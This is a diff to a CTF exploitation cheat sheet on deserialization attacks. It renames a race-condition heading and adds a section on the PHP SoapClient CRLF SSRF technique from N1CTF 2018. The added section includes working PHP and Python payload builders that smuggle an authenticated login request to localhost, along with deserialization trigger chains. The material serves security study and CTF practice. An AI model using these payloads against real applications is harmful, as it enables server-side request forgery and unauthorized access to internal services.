@@ -5,11 +5,12 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 ## Table of Contents
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
 - [Python Pickle Deserialization](#python-pickle-deserialization)
-- [Race Conditions (TOCTOU)](#race-conditions-toctou)
+- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
 - [Java XMLDecoder Deserialization RCE (HackIM 2016)](#java-xmldecoder-deserialization-rce-hackim-2016)
 - [.NET JSON TypeNameHandling Deserialization (DefCamp 2017)](#net-json-typenamehandling-deserialization-defcamp-2017)
 - [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
+- [PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)](#php-soapclient-crlf-ssrf-via-__call-deserialization-n1ctf-2018)
 
 ---
 
@@ -93,7 +94,7 @@ class ExecRCE:
 
 ---
 
-## Race Conditions (TOCTOU)
+## Race Conditions (Time-of-Check to Time-of-Use)
 
 **Pattern:** Server checks a condition (balance, registration uniqueness, coupon validity) then performs an action in separate steps. Concurrent requests between check and action bypass the validation.
 
@@ -266,5 +267,59 @@ $_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
 4. PHP deserializer reads exactly `s:170:` bytes, stops mid-string, and finds the injected `";}s:5:"photo";s:10:"config.php";}` as the next serialized field
 
 **Key insight:** Any post-serialization string expansion or contraction creates exploitable length mismatches for object injection. Look for word filters, censorship, or sanitization applied after `serialize()` but before storage/`unserialize()`.
+
+---
+
+### PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)
+
+**Pattern:** When PHP deserializes a `SoapClient` object and a non-existent method is called on it, the `__call()` magic method fires an HTTP request. CRLF injection in the `uri` parameter allows crafting arbitrary HTTP requests to localhost (SSRF). This turns any deserialization sink + method call into a full SSRF primitive.
+
+**How it works:**
+1. Attacker crafts a serialized `SoapClient` with CRLF-injected `uri` parameter
+2. Application deserializes the object (via `unserialize()`, session handler, or other deserialization sink)
+3. When any undefined method is called on the deserialized object, `__call()` triggers
+4. `SoapClient` sends an HTTP request to `location` with the crafted `uri` containing injected headers and body
+
+```php
+$p = array(
+    'uri' => "http://127.0.0.1/\r\nContent-Length:0\r\n\r\nPOST /index.php?action=login HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID=XXX\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nusername=admin&password=nu1ladmin&code=XXX\r\n\r\nPOST /foo\r\n",
+    'location' => 'http://127.0.0.1/'
+);
+$soap = new SoapClient(null, $p);
+// When getcountry() called on deserialized object -> triggers __call() -> sends crafted HTTP
+```
+
+```python
+import requests
+
+# Generate the serialized SoapClient payload
+# The CRLF in uri smuggles a complete second HTTP request
+php_serialize_script = '''
+<?php
+$target = "http://127.0.0.1/";
+$post_body = "username=admin&password=nu1ladmin&code=XXX";
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: PHPSESSID=target_session_id'
+);
+$payload = array(
+    'uri' => "http://127.0.0.1/\\r\\nContent-Length:0\\r\\n\\r\\nPOST /index.php?action=login HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n" . implode("\\r\\n", $headers) . "\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: " . strlen($post_body) . "\\r\\n\\r\\n" . $post_body . "\\r\\n\\r\\nPOST /foo\\r\\n",
+    'location' => $target
+);
+echo serialize(new SoapClient(null, $payload));
+?>
+'''
+
+# The serialized payload is then injected into the deserialization sink
+# e.g., via session manipulation, cookie injection, or POST parameter
+```
+
+**Common trigger chains:**
+```text
+unserialize(user_input) → $obj->anyMethod() → SoapClient::__call() → HTTP request
+session_start() with custom handler → SoapClient in session → __call() on access
+```
+
+**Key insight:** PHP's SoapClient `__call()` magic method fires HTTP requests when any undefined method is called. CRLF injection in the URI parameter smuggles complete HTTP requests, enabling authenticated SSRF to localhost. This is especially powerful when combined with other PHP deserialization vectors (session handlers, `phar://` wrappers) since `SoapClient` is a built-in PHP class requiring no additional libraries. Look for any code path where a deserialized object has a method called on it.
 
 ---
